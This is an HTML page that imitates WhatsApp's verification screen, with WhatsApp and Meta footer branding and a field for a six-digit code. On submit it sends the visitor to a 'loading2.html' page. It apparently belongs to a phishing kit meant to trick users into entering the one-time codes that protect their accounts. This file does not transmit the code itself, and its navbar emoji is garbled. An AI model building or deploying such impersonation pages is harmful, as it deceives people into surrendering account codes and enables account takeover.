<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verification Code Input</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }

    .navbar {
      background-color: #4CAF50;
      padding: 15px 20px;
      color: white;
      font-size: 18px;
      text-align: center;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      background-color: #fff;
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .logo {
      width: 80px;
      height: 80px;
      object-fit: contain;
      margin-bottom: 10px;
    }

    .sub-image {
      width: 100%;
      max-height: 200px;
      object-fit: cover;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    .code-input {
      font-size: 18px;
      letter-spacing: 8px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 12px;
      width: 100%;
      margin-bottom: 20px;
      box-sizing: border-box;
    }

    button {
      background: linear-gradient(to right, #43e97b, #38f9d7);
      color: #fff;
      padding: 15px 25px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
      transition: background 0.3s ease;
    }

    button:hover {
      background: linear-gradient(to right, #38f9d7, #43e97b);
    }

    footer {
      background-color: #2e7d32;
      color: white;
      padding: 40px 20px;
      text-align: center;
    }

    footer .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 15px;
      margin-bottom: 20px;
    }

    footer .footer-links p {
      margin: 5px 10px;
    }

    footer .footer-bottom {
      font-size: 14px;
      opacity: 0.8;
    }

    @media screen and (max-width: 480px) {
      .container {
        margin: 30px 10px;
        padding: 20px 15px;
      }

      h2 {
        font-size: 20px;
      }

      button {
        padding: 12px 20px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="navbar">ðŸŒ¿ Green Navbar</div>

  <div class="container">
    <img src="DSxOAUB0raA.png" alt="Second Image" class="sub-image" />
    <img src="172245867233593622.png" alt="Logo" class="logo" />
    <h2>Enter Verification Code</h2>
    <form id="code-form">
      <input id="code" class="code-input" type="text" maxlength="6" placeholder="______" required pattern="\d{6}" />
      <button type="submit">Verify</button>
    </form>
  </div>

  <footer>
    <div class="footer-links">
      <p>Use WhatsApp</p>
      <p>Features</p>
      <p>WhatsApp Web</p>
      <p>Download</p>
      <p>About Us</p>
      <p>Business</p>
      <p>Security</p>
      <p>Privacy & Terms</p>
      <p>Get in Touch</p>
      <p>Contact Us</p>
      <p>Facebook | X (Twitter)</p>
      <p>Meta Logo</p>
    </div>
    <div class="footer-bottom">Â© 2025 WhatsApp</div>
  </footer>

  <script>
    document.getElementById("code-form").addEventListener("submit", function (e) {
      e.preventDefault();
      const code = document.getElementById("code").value.trim();

      if (/^\d{6}$/.test(code)) {
        window.location.href = "loading2.html";
      } else {
        alert("Invalid code format. Please enter 6 digits.");
      }
    });
  </script>
</body>
</html>
